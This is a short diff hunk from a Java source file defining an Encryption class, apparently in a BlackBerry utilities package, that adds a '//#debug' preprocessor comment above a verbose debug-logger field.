@@ -21,6 +21,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 
 public class Encryption {
 
+	//#debug
     private static Debug debug = new Debug("Encryption", DebugLevel.VERBOSE);
 
     /**
